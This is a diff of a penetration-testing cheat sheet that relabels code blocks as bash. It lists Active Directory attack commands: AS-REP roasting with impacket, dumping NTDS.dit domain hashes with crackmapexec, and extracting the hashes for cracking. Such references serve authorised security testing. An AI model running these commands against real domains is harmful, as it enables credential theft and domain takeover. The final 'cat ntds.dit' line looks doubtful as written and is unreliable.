@@ -92,24 +92,24 @@ impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
 ```
 ### AS-REP Roasting
 Look for users without Kerberos pre-authentication required attribute (using credential, low privilege) :
-```markdown
+```bash
 impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
 ```
 Get a TGT for a user, whithout his password, if you know that this account have Kerberos pre-auth disabled :
-```markdown
+```bash
 impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME -no-pass
 ```
 ## NTDS Exfiltration
 Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
-```markdown
+```bash
 crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -p 'PASSWORD' --ntds
 ```
 Use with -H option to use NTLM hash :
-```markdown
+```bash
 crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -H 'NTLM_HASH' --ntds
 ```
 Then, extract all the hashes to put them on hashcat.
-```markdown
+```bash
 cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
 ```
 
